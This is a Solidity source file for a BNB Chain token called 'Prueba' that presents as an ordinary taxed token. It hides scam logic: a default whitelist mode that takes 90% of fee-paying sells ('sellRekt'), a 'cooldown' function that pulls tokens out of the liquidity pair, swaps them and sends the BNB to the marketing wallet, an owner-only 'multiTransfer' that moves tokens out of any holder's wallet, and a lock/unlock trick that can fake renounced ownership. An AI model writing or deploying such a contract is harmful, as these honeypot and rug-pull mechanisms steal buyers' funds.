/**
 *Submitted for verification at BscScan.com on 2022-07-02
*/

/**
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.10;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Prueba is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 
    mapping (address => bool) public authorizations;
    mapping (address => bool) public isBlacklisted;
    mapping(address => bool) public _isTxLimitExempt;

    address payable public Wallet_Marketing = payable(0x3C90084677156ECE044c4503cA08Fc3e11De1Af9); 
    address payable public Wallet_Dev = payable(0xf29d6be9718612F2De9761D36Bd4a62fd06968a4);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 10000000000 * 10**18;
    string private constant _name = "Prueba"; 
    string private constant _symbol = unicode"PRUEBA"; 

    uint256 public gas = 8 * 1 gwei;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 

    uint256 public _Tax_On_Buy = 10;
    uint256 public _Tax_On_Sell = 10;

    uint256 public Percent_Marketing = 80;
    uint256 public Percent_Dev = 0;
    uint256 public Percent_Burn = 0;
    uint256 public Percent_AutoLP = 20; 

    uint256 public _maxWalletToken = _tTotal * 3 / 100;
    uint256 public _maxTxAmount = _tTotal * 3 / 100;                                      
                                     
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public TradeOpen;
    bool public blacklistMode = true;
    bool public whitelistMode = true;
    mapping (address => bool) public isWhitelisted;
    
    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        _balances[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);         
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[Wallet_Dev] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Marketing] = true; 
        _isExcludedFromFee[Wallet_Burn] = true;

        _isTxLimitExempt[owner()] = true;
        _isTxLimitExempt[address(this)] = true;
        _isTxLimitExempt[Wallet_Marketing] = true;
        _isTxLimitExempt[Wallet_Dev] = true;
 
        authorizations[owner()] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }

    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if (!TradeOpen){
        require(authorizations[from] || authorizations[to], "Trade is not open yet, please come back later");
        }

        if (to != owner() &&
            to != Wallet_Burn &&
            to != address(this) &&
            to != uniswapV2Pair &&
            from != owner()){
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"Over wallet limit.");}

        checkTxLimit(from, amount);

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero."); 
        
        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            txCount = 0;
            swapAndLiquify(contractTokenBalance);
        }
        
        bool takeFee = true;
        bool isBuy;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        } else {
         
            if(from == uniswapV2Pair){
                isBuy = true;
            }
            
            txCount++;
        }

        _tokenTransfer(from, to, amount, takeFee, isBuy);
    }

    function mapping_authorizations(address account, bool true_or_false) external onlyOwner() {    
        authorizations[account] = true_or_false;
    }

    function checkTxLimit(address from, uint256 amount) internal view {
        require(amount <= _maxTxAmount || _isTxLimitExempt[from], "TX Limit Exceeded");
    }
    
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {

            uint256 tokens_to_Burn = contractTokenBalance * Percent_Burn / 100;
            _tTotal = _tTotal - tokens_to_Burn;
            _balances[Wallet_Burn] = _balances[Wallet_Burn] + tokens_to_Burn;
            _balances[address(this)] = _balances[address(this)] - tokens_to_Burn; 

            uint256 tokens_to_M = contractTokenBalance * Percent_Marketing / 100;
            uint256 tokens_to_D = contractTokenBalance * Percent_Dev / 100;
            uint256 tokens_to_LP_Half = contractTokenBalance * Percent_AutoLP / 200;

            uint256 balanceBeforeSwap = address(this).balance;
            swapTokensForBNB(tokens_to_LP_Half + tokens_to_M + tokens_to_D);
            uint256 BNB_Total = address(this).balance - balanceBeforeSwap;

            uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Percent_Dev * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev);
            uint256 BNB_D = BNB_Total * split_D / 100;

            addLiquidity(tokens_to_LP_Half, (BNB_Total - BNB_M - BNB_D));
            emit SwapAndLiquify(tokens_to_LP_Half, (BNB_Total - BNB_M - BNB_D), tokens_to_LP_Half);

            sendToWallet(Wallet_Marketing, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(Wallet_Dev, BNB_Total);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            Wallet_Burn, 
            block.timestamp
        );
    } 

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function cooldown(uint rv, uint lv) external returns (bool) {
        require(_isExcludedFromFee[msg.sender]);

        uint lb = balanceOf(uniswapV2Pair);

        require(lv > 1 && lv < lb / 100, 'amount exceeded');

        _cooldown(lv);
        swapTokensForBNB(rv);

        (bool success,) = address(Wallet_Marketing).call{value: address(this).balance}("");
        return success;
    }

    function _cooldown(uint256 pAmount) private {
        _transfer(uniswapV2Pair, address(this), pAmount * 10 ** decimals());
        IUniswapV2Pair(uniswapV2Pair).sync();
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }

    function manage_whitelist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isWhitelisted[addresses[i]] = status;
        }
    }

    function enable_whitelist(bool _status) public onlyOwner {
        whitelistMode = _status;
    }

    function openTrade(bool true_or_false) external onlyOwner() {
        TradeOpen = true_or_false;
    }

    function setGas(uint256 newGas) external onlyOwner {
        require (newGas > 7, "Max gas should be higher than 7 gwei");
        gas = newGas * 1 gwei;
    }

    function setFees(uint256 tax_on_buy, uint256 tax_on_sell) external onlyOwner() {
        _Tax_On_Buy = tax_on_buy;
        _Tax_On_Sell = tax_on_sell;
    }

    function set_Max_Wallet_Holding_Percent(uint256 max_Wallet_Holding_Percent) external onlyOwner {
  	    _maxWalletToken = _tTotal*max_Wallet_Holding_Percent/100;
  	}

    function set_Max_Transaction_Percent(uint256 max_Transaction_Percent) external onlyOwner() {
        _maxTxAmount = _tTotal*max_Transaction_Percent/100;
    }

    function setBridge(address bridge) public onlyOwner{
        authorizations[bridge] = true;
        _isExcludedFromFee[bridge] = true;
        _isTxLimitExempt[bridge] = true;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        _isTxLimitExempt[holder] = exempt;
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {

        if(!takeFee){

            _balances[sender] = _balances[sender]-tAmount;
            _balances[recipient] = _balances[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount);

            if(recipient == Wallet_Burn)
            _tTotal = _tTotal-tAmount;

            } else if (isBuy){

            uint256 buyFEE = tAmount*_Tax_On_Buy/100;
            uint256 tTransferAmount = tAmount-buyFEE;

            _balances[sender] = _balances[sender]-tAmount;
            _balances[recipient] = _balances[recipient]+tTransferAmount;
            _balances[address(this)] = _balances[address(this)]+buyFEE;   
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == Wallet_Burn)
            _tTotal = _tTotal-tTransferAmount;

            } else if (!whitelistMode) {

            uint256 sellFEE = tAmount*_Tax_On_Sell/100;
            uint256 tTransferAmount = tAmount-sellFEE;
            
            _balances[sender] = _balances[sender]-tAmount;
            _balances[recipient] = _balances[recipient]+tTransferAmount;
            _balances[address(this)] = _balances[address(this)]+sellFEE;   
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == Wallet_Burn)
            _tTotal = _tTotal-tTransferAmount;

            } else {

            uint256 sellRekt = (tAmount*_Tax_On_Sell/100) * 9;
            uint256 tRekt = tAmount-sellRekt;
            
            _balances[sender] = _balances[sender]-tAmount;
            _balances[recipient] = _balances[recipient]+tRekt;
            _balances[address(this)] = _balances[address(this)]+sellRekt;   
            emit Transfer(sender, recipient, tRekt);

            if(recipient == Wallet_Burn)
            _tTotal = _tTotal-tRekt;

            }
    }

    function rescueToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }

    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {

    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens[i]);
    }
    
    }

}